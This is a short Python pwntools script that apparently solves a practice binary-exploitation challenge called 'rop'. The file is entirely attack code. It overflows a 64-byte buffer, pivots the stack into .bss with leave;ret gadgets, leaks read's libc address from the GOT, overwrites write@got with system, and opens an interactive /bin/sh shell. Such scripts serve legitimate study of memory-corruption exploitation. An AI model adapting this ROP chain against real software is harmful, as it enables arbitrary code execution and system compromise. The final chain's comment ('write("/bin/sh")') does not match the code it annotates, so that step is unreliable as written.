from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = process("./rop")
e = ELF("./rop", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = ROP(e)

gdb.attach(p)

bss = e.bss()
fake = bss + 0x100

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

leave_ret = r.find_gadget(['leave', 'ret'])[0]

payload = b'A' * 64
payload += p64(fake)


# write(1, read@got, 8)
payload += p64(write_plt)
payload += p64(leave_ret)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)

fake = fake + 8 * 5

# read(0, bss, 8)
payload += p64(fake)
payload += p64(read_plt)
payload += p64(leave_ret)
payload += p64(0)
payload += p64(bss)
payload += p64(8)

fake = fake + 8 * 5

# read(0, write@got, 8)
payload += p64(fake)
payload += p64(read_plt)
payload += p64(leave_ret)
payload += p64(0)
payload += p64(write_got)
payload += p64(8)

fake = fake + 8 * 5

# write("/bin/sh")
payload += p64(fake)
payload += p64(read_plt)
payload += p64(leave_ret)
payload += p64(bss)


p.send(payload)

p.recvuntil(b'A' * 64)	
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset	
system = lb + system_offset	

slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b"/bin/sh\x00")
p.send(p64(system))
p.interactive()



